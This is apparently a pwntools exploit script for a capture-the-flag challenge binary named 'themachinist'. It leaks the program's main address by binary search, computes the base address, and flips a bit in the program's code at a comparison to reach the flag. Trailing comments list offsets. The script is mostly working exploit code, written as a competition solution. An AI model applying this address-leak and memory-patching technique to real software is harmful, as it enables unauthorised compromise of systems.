from pwn import *

exe = ELF('./themachinist')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        continue
    """)
elif args.REMOTE:
    io = remote('dyn.ctf.pearlctf.in', 30022)


# ****************************************
# leak main address
# ****************************************
io.sendlineafter(b'(1-4):', b'1')
ok = 0
ng = 1 << 60
while ng - ok > 1:
    x = (ok + ng) // 2
    io.sendlineafter(b'recipe:', str(x).encode())
    res = io.recvline()
    print(hex(ok), hex(ng), res)
    if b'overdone!' in res:
        ng = x
    else:
        ok = x

main_address = ok
print(f'{hex(main_address) = }')

# ****************************************
# edit program & get flag
# ****************************************

def remove(target, index):
    # &target ^= (1 << index)
    io.sendlineafter(b'(1-4):', b'2')
    io.sendlineafter(b'with:', hex(target).encode())
    io.sendlineafter(b'ingredient:', str(index).encode())
    io.sendlineafter(b'remove):', b'r')
    print(io.recvline())

base_address = main_address - 0x12e9
target = base_address + 0x1765
print(f'{hex(target) = }')

remove(target, 0)
io.interactive()

# main: 12e9
# Congrat: 1526
# cmp: 175d
# Choose :15f2
# 46f7

# 0x556877171760: 
# 0x556877171761:

